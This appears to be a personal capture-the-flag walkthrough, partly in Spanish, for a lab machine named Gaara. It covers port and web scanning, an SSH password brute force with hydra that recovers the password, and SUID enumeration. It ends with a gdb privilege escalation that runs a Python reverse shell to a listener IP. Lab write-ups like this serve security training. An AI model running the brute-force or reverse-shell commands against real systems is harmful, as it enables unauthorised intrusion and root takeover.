# Gaara

## Recon 
```bash
silent-scan $TARGET
nmap -sVC -p22,80 $TARGET -oN service 
```

**Output**
```

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
```

---

## Web Fuzzing

```bash
gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,bak,old,git -o gobuster.txt
```

## Nikto and nuclei scan
```bash
nuclei -target http://$TARGET
nikto -h http://$TARGET
```
---

## No nos ha dado ningun resultado als tecnicas anteriores pasamos a la fuerza bruta 

## Tenemos unu usuario potencial gaara vamos a atacar ssh con fuerza bruta usando hydra

```bash
### Ataque de Diccionario con medusa
hydra -l gaara -P /usr/share/wordlists/rockyou.txt ssh://$TARGET -t 4 -V
```
**Output**
```
[ATTEMPT] target 192.168.228.142 - login "gaara" - pass "iloveyou2" - 206 of 14344399 [child 3] (0/0)
[22][ssh] host: 192.168.228.142   login: gaara   password: iloveyou2
```
--- 
## Linux Enumeration

```bash
ssh gaara@$TARGET
iloveyou2
# Grab the user flag
cat local.txt
cat /etc/passwd
# Buscamos suid 
find / -perm -4000 -type f 2>/dev/null | xargs ls -la | grep -v snap
```
**Output**
```
/usr/bin/gdb
/usr/bin/sudo
/usr/bin/gimp-2.10
```
---

### The most interesting Suid file is GDB
https://gtfobins.org/gtfobins/gdb/

## Priviesc
```bash
which python
nc -lvnp 8080
# Ejecutamos gbd -nx sin cargar archivos de config -p adjuntarse al proceso con pid 1 -ex "python" ejecuta codigo python dentro de GDB
# os.setuid(0) fuerza al proceso a convertirse en root real
/usr/bin/gdb -nx -p 1 -ex 'python import os; os.setuid(0); import socket,pty;s=socket.socket();s.connect(("192.168.45.169",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' -ex quit
```

---
silen

## Related Notes

- [nmap](../../../tools/recon/nmap.md)
- [gobuster](../../../tools/fuzz/gobuster.md)
- [nuclei](../../../tools/recon/nuclei.md)
- [nikto](../../../tools/web/nikto.md)
- [hydra](../../../tools/creds/hydra.md)
- [netcat](../../../tools/pivot/netcat.md)
- [gdb-suid-privesc](../../../privesc/linux/gdb-suid-privesc.md)

